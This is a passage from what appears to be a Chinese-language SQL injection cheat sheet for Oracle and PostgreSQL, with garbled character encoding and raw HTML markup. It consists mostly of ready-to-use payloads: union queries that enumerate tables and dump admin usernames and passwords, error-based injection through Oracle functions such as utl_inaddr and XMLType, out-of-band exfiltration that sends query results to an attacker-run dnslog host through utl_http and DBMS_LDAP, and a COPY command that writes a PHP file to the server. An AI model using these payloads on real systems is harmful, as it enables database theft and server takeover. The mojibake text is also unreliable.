class="hljs-keyword">group</span>(<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> owner)name <span class="hljs-keyword">from</span> all_tables <span class="hljs-keyword">where</span> owner<span class="hljs-operator">=</span><span class="hljs-string">&#x27;ORACLE1&#x27;</span>)),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> dual <span class="hljs-comment">--</span><br>æŸ¥è¯¢è¡¨å<br></code></pre></td></tr></table></figure>

<p>7.è·å–å­—æ®µå</p>
  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,column_name,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> user_tab_columns <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> table_name <span class="hljs-operator">=</span><span class="hljs-string">&#x27;ADMIN&#x27;</span><span class="hljs-comment">--</span><br>æŸ¥è¯¢ç¬¬ä¸€ä¸ªå­—æ®µåä¸ºUNAME<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,column_name,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> user_tab_columns <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> table_name <span class="hljs-operator">=</span><span class="hljs-string">&#x27;ADMIN&#x27;</span> <span class="hljs-keyword">and</span> column_name<span class="hljs-operator">&lt;&gt;</span><span class="hljs-string">&#x27;UNAME&#x27;</span><span class="hljs-comment">--</span><br>æŸ¥è¯¢ç¬¬äºŒä¸ªå­—æ®µåä¸ºUPASS <br></code></pre></td></tr></table></figure>
<p>  æ³¨æ„è‡ªå·±å¢åŠ rownumçš„æ•°å€¼</p>
<p>8.æŸ¥è¯¢è¡¨å­—æ®µæ•°æ®</p>
  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,column_name,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> user_tab_columns <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> table_name <span class="hljs-operator">=</span><span class="hljs-string">&#x27;ADMIN&#x27;</span><span class="hljs-comment">--</span><br>æŸ¥è¯¢ç¬¬ä¸€ä¸ªå­—æ®µåä¸ºUNAME<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,column_name,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> user_tab_columns <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> table_name <span class="hljs-operator">=</span><span class="hljs-string">&#x27;ADMIN&#x27;</span> <span class="hljs-keyword">and</span> column_name<span class="hljs-operator">&lt;&gt;</span><span class="hljs-string">&#x27;UNAME&#x27;</span><span class="hljs-comment">--</span><br>æŸ¥è¯¢ç¬¬äºŒä¸ªå­—æ®µåä¸ºUPASS<br></code></pre></td></tr></table></figure>


<h3 id="æŠ¥é”™æ³¨å…¥-1"><a href="#æŠ¥é”™æ³¨å…¥-1" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><p>åˆ©ç”¨ <strong>utl_inaddr.get_host_name</strong><br>è¿™ç§æ–¹æ³•åœ¨Oracle 8gï¼Œ9gï¼Œ10gä¸­ä¸éœ€è¦ä»»ä½•æƒé™ï¼Œä½†æ˜¯åœ¨<strong>Oracle 11gä»¥åŠä»¥å</strong>çš„ç‰ˆæœ¬ä¸­ï¼Œå®˜æ–¹åŠ å¼ºäº†è®¿é—®æ§åˆ¶æƒé™ï¼Œæ‰€ä»¥åœ¨11gä»¥åè¦ä½¿ç”¨æ­¤æ–¹æ³•è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œå½“å‰æ•°æ®åº“ç”¨æˆ·å¿…é¡»æœ‰ç½‘ç»œè®¿é—®æƒé™</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-string">&#x27; and 1=utl_inaddr.get_host_name((select user from dual))-- </span><br></code></pre></td></tr></table></figure>

<p>åˆ©ç”¨ <strong>ctxsys.drithsx.sn()</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-string">&#x27; and 1=ctxsys.drithsx.sn(1,(select user from dual))-- </span><br></code></pre></td></tr></table></figure>

<p>åˆ©ç”¨ <strong>dbms_xdb_version.checkin()</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not nullâ€“- </span><br></code></pre></td></tr></table></figure>

<p>åˆ©ç”¨<strong>dbms_xdb_version.uncheckout()</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null --</span><br></code></pre></td></tr></table></figure>

<p>åˆ©ç”¨<strong>dbms_utility.sqlid_to_sqlhash()</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null --</span><br></code></pre></td></tr></table></figure>

<p>åˆ©ç”¨<strong>ordsys.ord_dicom.getmappingxpath()</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)</span><br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨decodeè¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œè¿™ç§æ–¹å¼æ›´åå‘å¸ƒå°”å‹æ³¨å…¥ï¼Œå› ä¸ºè¿™ç§æ–¹å¼å¹¶ä¸ä¼šé€šè¿‡æŠ¥é”™æŠŠæŸ¥è¯¢ç»“æœå›æ˜¾å›æ¥ï¼Œä»…æ˜¯ç”¨æ¥ä½œä¸ºé¡µé¢çš„è¡¨ç°ä¸åŒçš„åˆ¤æ–­æ–¹æ³•ã€‚</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=(select decode(substr(user,1,1),&#x27;</span>A<span class="hljs-string">&#x27;,(1/0),0) from dual) --</span><br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œæ˜¯åˆ¤æ–­ç¬¬ä¸€ä½æ˜¯å¦ä¸ºA,ä¾æ¬¡åˆ¤æ–­</p>
<p><strong>XMLType</strong></p>
<p>åœ¨ä½¿ç”¨è¿™ä¸ªXMLTypeè¿›è¡ŒæŠ¥é”™æ—¶ï¼Œå¾ˆå¤šäººä¸çŸ¥é“ä¸ºä»€ä¹ˆè¦ç”¨chr(60)ï¼Œé€šè¿‡asciiæŸ¥è¯¢å¯ä»¥çœ‹åˆ°ï¼Œ60:&lt; , 58:â€™:â€™,62:â€™&gt;â€™,æŸ¥äº†ä¸‹ç›¸å…³çš„apiï¼Œå‘ç°xmltypeåœ¨è¿›è¡Œè§£æçš„æ—¶å€™å¿…é¡»ä»¥&lt;å¼€å¤´&gt;ç»“å°¾ï¼Œè¿™é‡Œ:å†’å·åœ¨è¿™æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œè‡³äºä¸ºä»€ä¹ˆæ˜¯å†’å·è¿™ä¸ªæˆ‘ä¹Ÿæ²¡æŸ¥åˆ°ï¼Œå¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœè¿”å›çš„æ•°æ®ç§æœ‰ç©ºæ ¼çš„è¯ï¼Œå®ƒä¼šè‡ªåŠ¨æˆªæ–­ï¼Œå¯¼è‡´æ•°æ®ä¸å®Œæ•´ï¼Œæœ‰replaceå‡½æ•°æ›¿æ¢æˆå…¶ä»–éç©ºå­—ç¬¦å°±å¯ä»¥ã€‚</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null--</span><br></code></pre></td></tr></table></figure>

<h3 id="Oracleå¸¦å¤–é€šä¿¡è·å–ä¿¡æ¯-dnslogæ³¨å…¥"><a href="#Oracleå¸¦å¤–é€šä¿¡è·å–ä¿¡æ¯-dnslogæ³¨å…¥" class="headerlink" title="Oracleå¸¦å¤–é€šä¿¡è·å–ä¿¡æ¯ dnslogæ³¨å…¥"></a>Oracleå¸¦å¤–é€šä¿¡è·å–ä¿¡æ¯ dnslogæ³¨å…¥</h3><p><strong>utl_http.request()</strong>  dnslogæ³¨å…¥</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=utl_http.request(&#x27;</span>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.10</span>(è‡ªå·±æ­å»ºdnslogæˆ–è€…ç”¨ç°æœ‰çš„):<span class="hljs-number">80</span><span class="hljs-operator">/</span><span class="hljs-string">&#x27;||(select banner from sys.v_$version where rownum=1)) --</span><br></code></pre></td></tr></table></figure>

<p><strong>utl_inaddr.get_host_address()</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select utl_inaddr.get_host_address((select user from dual)||&#x27;</span>.sssss.com(è‡ªå·±æ­å»ºdnslogæˆ–è€…ç”¨ç°æœ‰çš„)<span class="hljs-string">&#x27;) from dual)is not null --</span><br></code></pre></td></tr></table></figure>

<p><strong>SYS.DBMS_LDAP.INIT</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select SYS.DBMS_LDAP.INIT((select user from dual)||&#x27;</span>.sssss.com(è‡ªå·±æ­å»ºdnslogæˆ–è€…ç”¨ç°æœ‰çš„)<span class="hljs-string">&#x27;) from dual)is not null --</span><br></code></pre></td></tr></table></figure>



<h2 id="GetShell-2"><a href="#GetShell-2" class="headerlink" title="GetShell"></a>GetShell</h2><p>ä¾é ä¸‡èƒ½çš„sqlmap</p>
<h1 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51295677/article/details/125641760">https://blog.csdn.net/qq_51295677/article/details/125641760</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/249371.html">https://www.freebuf.com/articles/web/249371.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42357070/article/details/81873458">https://blog.csdn.net/qq_42357070/article/details/81873458</a></p>
<p><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/rainx/topics/1396671">https://www.dazhuanlan.com/rainx/topics/1396671</a></p>
</blockquote>
<h2 id="åˆ¤æ–­æ–¹æ³•-3"><a href="#åˆ¤æ–­æ–¹æ³•-3" class="headerlink" title="åˆ¤æ–­æ–¹æ³•"></a>åˆ¤æ–­æ–¹æ³•</h2><p><code>and len(&#39;a&#39;)=1</code> æ˜¯å¦å‡ºç°æŠ¥é”™ï¼Œå› ä¸ºåœ¨postgresqlé‡Œé¢ä½¿ç”¨çš„æ˜¯lengthå‡½æ•°æ¥è¿”å›é•¿åº¦ï¼Œå¦‚æœå‡ºç°æŠ¥é”™ï¼Œé‚£ä¹ˆå¯ä»¥å¤§è‡´åˆ¤æ–­æ˜¯postgresqlæˆ–orancleï¼ˆä¸æ’é™¤å…¶ä»–éä¸»æµæ•°æ®åº“ç±»å‹ï¼‰</p>
<p>å¹¶ä¸”orancleå¯ä»¥ä½¿ç”¨dualè¡¨æ¥åˆ¤æ–­ï¼Œå¦‚æœæµ‹è¯•åæ— dualï¼Œå°±å¯ä»¥å¤§è‡´åˆ¤æ–­æ˜¯postgresqläº†</p>
<p>å½“ç„¶è¿˜æœ‰ä¸€ç§æ–¹å¼ï¼š</p>
<p>postgreSQLæŸ¥è¯¢å½“å‰æ•°æ®åº“ä½¿ç”¨ï¼šcurrent_database()å‡½æ•°</p>
<p>å¼€æ”¾ç«¯å£ï¼š5432</p>
<h2 id="åŸºæœ¬æ³¨å…¥-3"><a href="#åŸºæœ¬æ³¨å…¥-3" class="headerlink" title="åŸºæœ¬æ³¨å…¥"></a>åŸºæœ¬æ³¨å…¥</h2><p>ç»“åˆäº†MySQLçš„è¯­å¥å’Œsqlserverçš„å¼ºç±»å‹ï¼Œä¸ºæˆ‘ä»¬çš„æŠ¥é”™æ³¨å…¥åŸ‹ä¸‹äº†ä¼ç¬”</p>
<h3 id="è”åˆæŸ¥è¯¢-2"><a href="#è”åˆæŸ¥è¯¢-2" class="headerlink" title="è”åˆæŸ¥è¯¢"></a>è”åˆæŸ¥è¯¢</h3><ol>
<li><p>åˆ¤æ–­é—­åˆ æ³¨é‡Šç¬¦ä¸ºâ€“+ åŒMySQL</p>
</li>
<li><p>è·å–å­—æ®µæ•° åŒMySQL</p>
</li>
<li><p>æ³¨å‡ºå›æ˜¾ç‚¹ ç»“åˆmysql+sqlserver</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,(<span class="hljs-string">&#x27;11111&#x27;</span>),<span class="hljs-keyword">NULL</span><span class="hljs-comment">-- æŸ¥çœ‹æ˜¯å¦è¾“å‡º 11111</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>è·å–æ•°æ®åº“å</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,current_database(),<span class="hljs-keyword">NULL</span><span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure>
</li>
<li><p>è·å–æ•°æ®åº“ä¸­çš„è¡¨</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; union all select null,&#x27;</span>null1<span class="hljs-string">&#x27;,tablename,null,null,&#x27;</span>null3<span class="hljs-string">&#x27;,null,&#x27;</span>null4<span class="hljs-string">&#x27; from pg_tables where schemaname=&#x27;</span><span class="hljs-built_in">public</span><span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>è·å–è¡¨ä¸­çš„åˆ—å</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-built_in">column_name</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;public&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;è¡¨å&#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></li>
</ol>
<p>â€‹	éœ€è¦ä¿®æ”¹offeståçš„æ•°å­—</p>
<ol start="7">
<li><p>dumpå…¨éƒ¨å†…å®¹</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">12</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,åˆ—å<span class="hljs-number">1</span>||<span class="hljs-string">&#x27;::&#x27;</span>||åˆ—å<span class="hljs-number">2</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">public</span>.è¡¨å<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>

<p>è¿”å›å†…å®¹å°†æ˜¯â€åˆ—å1æ•°æ®::åˆ—å2æ•°æ®â€œ</p>
</li>
</ol>
<h3 id="æŠ¥é”™æ³¨å…¥-2"><a href="#æŠ¥é”™æ³¨å…¥-2" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><p>postgresqlçš„æŠ¥é”™æ³¨å…¥åŸç†ä¸MSSQLçš„ç›¸åŒåˆ©ç”¨å¼ºç±»å‹è¯­è¨€æ•°æ®åº“ç‰¹æ€§ï¼Œå½“ç±»å‹ä¸ä¸€è‡´æ—¶å°†ä¼šæŠ¥é”™å¸¦å‡ºæ•æ„Ÿæ•°æ®è¾¾åˆ°æ³¨å…¥çš„ç›®çš„ã€‚å…·ä½“ç”¨åˆ°çš„å‡½æ•°ä¸MSSQLç›¸åŒï¼Œcast()æˆ–è€…convert()è¿™ç§å¼ºåˆ¶è½¬æ¢çš„å‡½æ•°åœ¨ä¸ä¸€ä¸ªæ•°æ¯”è¾ƒè¾¾åˆ°æŠ¥é”™ç›®çš„ã€‚ï¼ˆå‰ææ˜¯ç›®æ ‡ç½‘ç«™å¼€å¯äº†æŠ¥é”™æç¤ºï¼‰ã€‚</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">æŸ¥çœ‹ç‰ˆæœ¬ï¼š<br><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">2</span>=CAST((<span class="hljs-keyword">SELECT</span> version())::<span class="hljs-type">text</span> <span class="hljs-keyword">AS</span> <span class="hljs-type">NUMERIC</span>)<br><br>æŸ¥åº“ï¼š<br><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">2</span>=CAST((<span class="hljs-keyword">SELECT</span> current_database())::<span class="hljs-type">text</span> <span class="hljs-keyword">AS</span> <span class="hljs-type">NUMERIC</span>)<br><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">2</span>=CAST((<span class="hljs-keyword">SELECT</span> datname <span class="hljs-keyword">from</span> pg_database <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span>)::<span class="hljs-type">text</span> <span class="hljs-keyword">AS</span> <span class="hljs-type">NUMERIC</span>)<br><br>æŸ¥è¡¨ï¼š<br><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">2</span>=CAST((<span class="hljs-keyword">SELECT</span> relname <span class="hljs-keyword">from</span> pg_stat_user_tables <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span>)::<span class="hljs-type">text</span> <span class="hljs-keyword">AS</span> <span class="hljs-type">NUMERIC</span>)<br><br><br>æŸ¥åˆ—ï¼š<br><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">2</span>=CAST((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span>)::<span class="hljs-type">text</span> <span class="hljs-keyword">AS</span> <span class="hljs-type">NUMERIC</span>)<br><br><br>è¿˜æœ‰ä¸€ä¸ªsqlmapè·‘å‡ºæ¥çš„payloadï¼ˆä»…ä¾›å‚è€ƒï¼‰ï¼š<br><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">7778</span>=CAST((CHR(<span class="hljs-number">113</span>)||CHR(<span class="hljs-number">98</span>)||CHR(<span class="hljs-number">122</span>)||CHR(<span class="hljs-number">106</span>)||CHR(<span class="hljs-number">113</span>))||(<span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (<span class="hljs-number">7778</span>=<span class="hljs-number">7778</span>) <span class="hljs-keyword">THEN</span> <span class="hljs-number">1</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-number">0</span> <span class="hljs-keyword">END</span>))::<span class="hljs-type">text</span>||(CHR(<span class="hljs-number">113</span>)||CHR(<span class="hljs-number">118</span>)||CHR(<span class="hljs-number">112</span>)||CHR(<span class="hljs-number">106</span>)||CHR(<span class="hljs-number">113</span>)) <span class="hljs-keyword">AS</span> <span class="hljs-type">NUMERIC</span>)<br>è¿™é‡Œè§£é‡Šä¸€ä¸‹è¿™å‡ ä¸ªå‡½æ•°åœ¨è¿™é‡Œé¢çš„ä½œç”¨ï¼š<br></code></pre></td></tr></table></figure>

<h2 id="GetShell-3"><a href="#GetShell-3" class="headerlink" title="GetShell"></a>GetShell</h2><p>æ™®é€šå†™shell</p>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql"><span class="hljs-keyword">COPY</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>) <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;/tmp/1.php&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>åŒå¤§çš„äº’è”ç½‘ï¼Œæˆ‘ç«Ÿç„¶åªæ‰¾åˆ°ä¸€å¥æœ‰ç”¨çš„ğŸ˜­</p>
<h2 id="æŠ¥é”™æ³¨å…¥-3"><a href="#æŠ¥é”™æ³¨å…¥-3" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><ul>
<li><strong>utl_inaddr.get_host_name</strong></li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">åœ¨11gä¹‹å‰ä¸éœ€è¦ä»»ä½•æƒé™ï¼Œåœ¨11gä¹‹åå½“å‰çš„æ•°æ®åº“ç”¨æˆ·å¿…é¡»æœ‰ç½‘ç»œè®¿é—®æƒé™<br>select utl_inaddr.get_host_name((select user from dual)) from dual;<br></code></pre></td></tr></table></figure>

<ul>
<li><strong>ctxsys.drithsx.sn</strong></li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">å¤„ç†æ–‡æœ¬çš„å‡½æ•°ï¼Œä¼ å…¥å‚æ•°é”™è¯¯çš„æ—¶ä¼šæŠ¥é”™è¿”å›å¼‚å¸¸<br>select ctxsys.drithsx.sn(1, (select user from dual)) from dual;<br></code></pre></td></tr></table></figure>

<ul>
<li><strong>CTXSYS.CTX_REPORT.TOKEN_TYPE</strong></li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ç”¨äºå¤„ç†æ–‡æœ¬ï¼Œä¹Ÿä¼šå‡ºç°å‚æ•°é”™è¯¯è¿”å›å¼‚å¸¸<br>select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), &#x27;123&#x27;) from dual;<br></code></pre></td></tr></table></figure>

<ul>
<li><strong>XMLType</strong></li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">XMLTypeæ˜¯oracleç³»ç»Ÿå®šä¹‰çš„æ•°æ®ç±»å‹ï¼Œç³»ç»Ÿé¢„å®šä¹‰äº†å†…éƒ¨å‡½æ•°å»è®¿é—®XMLæ•°æ®<br>select XMLType(&#x27;&lt;:&#x27;||(select user from dual)||&#x27;&gt;&#x27;) from dual;<br>PSï¼šè°ƒç”¨çš„æ—¶å€™å¿…é¡»ä»¥&lt;:å¼€å¤´å’Œ&gt;ç»“å°¾ï¼Œå³ &#x27;&lt;:&#x27;||balabala||&#x27;&gt;&#x27; æˆ–è€… chr(60)||balabal||chr(62ï¼‰;å¦‚æœè¿”å›çš„æ•°æ®ç§æœ‰ç©ºæ ¼çš„è¯ï¼Œä¼šè‡ªåŠ¨æˆªæ–­ï¼Œå¯¼è‡´æ•°æ®ä¸å®Œæ•´ï¼Œè¿™ç§æƒ…å†µä¸‹éœ€è¦å…ˆè½¬ä¸º hexï¼Œå†å¯¼å‡º(æˆ–è€…æœ‰replaceå‡½æ•°æ›¿æ¢æˆå…¶ä»–éç©ºå­—ç¬¦)<br></code></pre></td></tr></table></figure>

<ul>
<li><strong>dbms_xdb_version.checkin</strong></li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select dbms_xdb_version.checkin((select user from dual)) from dual;<br></code></pre></td></tr></table></figure>

<ul>
